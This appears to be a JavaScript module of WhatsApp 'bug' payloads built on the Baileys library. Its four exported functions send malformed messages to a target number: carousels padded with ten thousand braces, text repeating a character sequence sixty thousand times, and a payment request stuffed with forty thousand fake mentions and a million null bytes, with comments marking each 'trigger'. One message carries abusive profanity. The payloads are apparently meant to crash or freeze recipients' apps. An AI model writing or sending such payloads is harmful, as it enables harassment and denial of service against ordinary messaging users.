const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap
} = require("@whiskeysockets/baileys"); 

const fs = require('fs');  
let client

async function carousels2(client, target) {
const cards = [];

const media = await prepareWAMessageMedia(
{ video: { url: "https://h.uguu.se/kFtHWpWs.mp4" } },
{ upload: client.waUploadToServer }
);

const header = {
videoMessage: media.videoMessage,
hasMediaAttachment: false,
contextInfo: {
forwardingScore: 666,
isForwarded: true,
stanzaId: "—ꞰR" + Date.now(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
extendedTextMessage: {
text: "🧬⃟༑⌁⃰𝐑͈𝐞𝐲͢𝐲 𝐏𝐫𝐢ͯ͢𝐦𝐞͢𝐫𝐨𝐬𝐞ཀ͜͡🪅",
contextInfo: {
mentionedJid: ["13135550002@s.whatsapp.net"],
externalAdReply: {
title: "—ꞰR",
body: "Leonardo Davinchi",
thumbnailUrl: "",
mediaType: 1,
sourceUrl: "https://primrosereyy.nichesite.org",
showAdAttribution: false // trigger 1
}
}
}
}
}
};

for (let r = 0; r < 15; r++) {
cards.push({
header,
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000) // trigger 2
}
});
}

const msg = generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: "Яêy4ŪꞰ🇬🇧"
},
carouselMessage: {
cards,
messageVersion: 1
},
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: "13135550002@s.whatsapp.net"
},
stanzaId: "—ꞰR" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
forwardingScore: 100,
isForwarded: true,
mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
externalAdReply: {
title: "Primrose",
body: "",
thumbnailUrl: "https://primrosereyy.nichesite.org",
mediaType: 1,
mediaUrl: "",
sourceUrl: "https://primrosereyy.nichesite.org",
showAdAttribution: false
}
}
}
}
}
},
{}
);

await client.relayMessage(target, msg.message, {
participant: { jid: target },
messageId: msg.key.id
});
}

async function forceCall(client, target) {
const cards = [];

const media = await prepareWAMessageMedia(
{ video: { url: "https://h.uguu.se/kFtHWpWs.mp4" } },
{ upload: client.waUploadToServer }
);

const header = {
videoMessage: media.videoMessage,
hasMediaAttachment: false,
contextInfo: {
forwardingScore: 666,
isForwarded: true,
stanzaId: "—ꞰR" + Date.now(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
extendedTextMessage: {
text: "🧬⃟༑⌁⃰𝐑͈𝐞𝐲͢𝐲 𝐏𝐫𝐢ͯ͢𝐦𝐞͢𝐫𝐨𝐬𝐞ཀ͜͡🪅",
contextInfo: {
mentionedJid: ["13135550002@s.whatsapp.net"],
externalAdReply: {
title: "—ꞰR",
body: "Leonardo Davinchi",
thumbnailUrl: "",
mediaType: 1,
sourceUrl: "https://primrosereyy.nichesite.org",
showAdAttribution: false // trigger 1
}
}
}
}
}
};

for (let r = 0; r < 15; r++) {
cards.push({
header,
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000) // trigger 2
}
});
}

const msg = generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: "Яêy4ŪꞰ🇬🇧"
},
carouselMessage: {
cards,
messageVersion: 1
},
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: "13135550002@s.whatsapp.net"
},
stanzaId: "—ꞰR" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
forwardingScore: 100,
isForwarded: true,
mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
externalAdReply: {
title: "Primrose",
body: "",
thumbnailUrl: "https://primrosereyy.nichesite.org",
mediaType: 1,
mediaUrl: "",
sourceUrl: "https://primrosereyy.nichesite.org",
showAdAttribution: false
}
}
}
}
}
},
{}
);

await client.relayMessage(target, msg.message, {
participant: { jid: target },
messageId: msg.key.id
});
}

async function loadedIos(client, target) {
await client.sendMessage(target, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ Яey4UꞰ🇬🇧 ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧ Яey4UꞰ🇬🇧 ⛧`,
body: `—Fuck ${pushname} you.`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/x`
}
}
}, { quoted: m })
}

async function PayXDocInvis(client, target) {
try {
const bugMessage = {
key: {
remoteJid: "status@broadcast",
participant: target,
fromMe: false
},
message: {
viewOnceMessage: {
message: {
requestPaymentMessage: {
currencyCodeIso4217: "XXX",
amount1000: 999999999,
expiryTimestamp: Date.now() + 86400000,
requestFrom: "5521992999999@s.whatsapp.net",
noteMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0&mms3=true",
mimetype: "application/octet-stream",
fileSha256: "TGm7yntjlt1nZjJ8wLE/xkuXxYFELupibDkZZD83k8Q=",
fileEncSha256: "QUlCoNMgSucbRYWuHe2vzIrSoUaH+py7zePvtaSshqk=",
fileLength: "99999999999",
mediaKey: "TS0xXvvf6a1p/3WzoCuV/qQ3c2JNbiX2FuunvFWdDcc=",
fileName: "© -!s reyyy",
mediaKeyTimestamp: "1748420423",
directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0",
contextInfo: {
isForwarded: true,
forwardingScore: 9999,
forwardedNewsletterMessageInfo: {
newsletterName: "TheclientyzyX7",
newsletterJid: "120363309802495518@newsletter",
serverMessageId: 1
},
mentionedJid: Array.from({ length: 40000 }, () =>
"1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
),
businessMessageForwardInfo: {
businessOwnerJid: "5521992999999@s.whatsapp.net"
},
nativeFlowResponseMessage: {
name: "© -!s Reyy",
paramsJson: "\u0000".repeat(999999)
}
}
}
}
}
}
}
}
};

await client.relayMessage("status@broadcast", bugMessage.message, {
messageId: generateMessageID(),
statusJidList: [target],
additionalAttributes: {
participant: target
}
});

} catch (err) {
console.error("Error:", err);
}
}

module.exports = { loadedIos, PayXDocInvis, forceCall, carousels2 }